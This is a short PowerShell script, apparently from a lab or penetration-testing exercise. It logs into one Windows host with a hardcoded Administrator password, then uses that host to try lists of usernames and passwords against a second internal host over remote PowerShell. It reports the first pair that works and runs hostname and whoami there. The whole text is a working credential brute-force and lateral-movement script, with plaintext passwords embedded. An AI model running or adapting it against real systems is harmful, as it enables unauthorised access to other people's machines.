$pass = ConvertTo-SecureString "123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("Administrator", $pass)

Invoke-Command -ComputerName "192.168.1.132" -Credential $cred -ScriptBlock {
    $usernames = @("Administrator", "WIN-RKVRS24A9VK\Administrator", "User", "SinhVien")
    $passwords = @("Longko0!", "123", "abc@123", "P@ssw0rd123", "")
    
    foreach ($u in $usernames) {
        foreach ($p in $passwords) {
            try {
                $sec = ConvertTo-SecureString $p -AsPlainText -Force
                $c = New-Object System.Management.Automation.PSCredential($u, $sec)
                $res = Invoke-Command -ComputerName "192.168.11.2" -Credential $c -ScriptBlock {
                    hostname
                    whoami
                } -ErrorAction Stop
                Write-Host "[+] SUCCESS WITH USER: '$u', PASS: '$p'!" -ForegroundColor Green
                $res
                return
            } catch {
                # Continue
            }
        }
    }
    Write-Host "[-] All test combinations failed."
}
